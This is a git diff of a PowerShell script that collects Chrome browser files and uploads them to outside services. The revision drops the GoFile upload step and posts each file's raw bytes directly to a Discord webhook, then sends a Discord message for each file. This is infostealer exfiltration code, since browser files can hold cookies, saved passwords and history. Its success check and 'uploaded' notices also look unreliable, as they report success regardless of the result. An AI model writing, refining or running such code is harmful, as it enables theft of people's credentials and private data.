@@ -20,46 +20,44 @@ function Send-DiscordMessage {
     }
 }
 
-function Upload-FileAndGetLink {
+# Function to upload a file to Discord via webhook
+function Upload-FileToDiscord {
     param (
         [string]$filePath
     )
 
-    # Get URL from GoFile
-    $serverResponse = Invoke-RestMethod -Uri 'https://api.gofile.io/getServer'
-    if ($serverResponse.status -ne "ok") {
-        Write-Host "Failed to get server URL: $($serverResponse.status)"
-        return $null
-    }
+    $fileName = [System.IO.Path]::GetFileName($filePath)
+    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
 
-    # Define the upload URI
-    $uploadUri = "https://$($serverResponse.data.server).gofile.io/uploadFile"
-
-    # Prepare the file for uploading
-    $fileBytes = Get-Content $filePath -Raw -Encoding Byte
-    $fileEnc = [System.Text.Encoding]::GetEncoding('iso-8859-1').GetString($fileBytes)
     $boundary = [System.Guid]::NewGuid().ToString()
     $LF = "`r`n"
+    
+    # Prepare the form data for the POST request
     $bodyLines = (
         "--$boundary",
-        "Content-Disposition: form-data; name=`"file`"; filename=`"$([System.IO.Path]::GetFileName($filePath))`"",
+        "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
         "Content-Type: application/octet-stream",
         $LF,
-        $fileEnc,
+        [System.Text.Encoding]::Default.GetString($fileBytes),
         "--$boundary--",
         $LF
     ) -join $LF
 
-    # Upload the file
+    # Prepare the HTTP headers
+    $headers = @{
+        "Content-Type" = "multipart/form-data; boundary=$boundary"
+    }
+
+    # Upload the file via the Discord Webhook
     try {
-        $response = Invoke-RestMethod -Uri $uploadUri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
+        $response = Invoke-RestMethod -Uri $webhook -Method Post -Headers $headers -Body $bodyLines
         if ($response.status -ne "ok") {
-            Write-Host "Failed to upload file: $($response.status)"
+            Write-Host "Failed to upload file to Discord"
             return $null
         }
-        return $response.data.downloadPage
+        Write-Host "File uploaded successfully to Discord"
     } catch {
-        Write-Host "Failed to upload file: $_"
+        Write-Host "Failed to upload file to Discord: $_"
         return $null
     }
 }
@@ -79,16 +77,12 @@ if ($chromeFiles.Count -eq 0) {
     exit
 }
 
-# Iterate through each file and upload it to GoFile
+# Iterate through each file and upload it to Discord
 foreach ($file in $chromeFiles) {
-    $link = Upload-FileAndGetLink -filePath $file.FullName
+    Upload-FileToDiscord -filePath $file.FullName
 
-    # Check if the upload was successful and send the link via Discord
-    if ($link -ne $null) {
-        Send-DiscordMessage -message "File uploaded: $link"
-    } else {
-        Send-DiscordMessage -message "Failed to upload file: $($file.FullName)"
-    }
+    # Optionally, notify when each file is processed
+    Send-DiscordMessage -message "File uploaded: $($file.FullName)"
 }
 
 # Optionally, notify when all files are processed
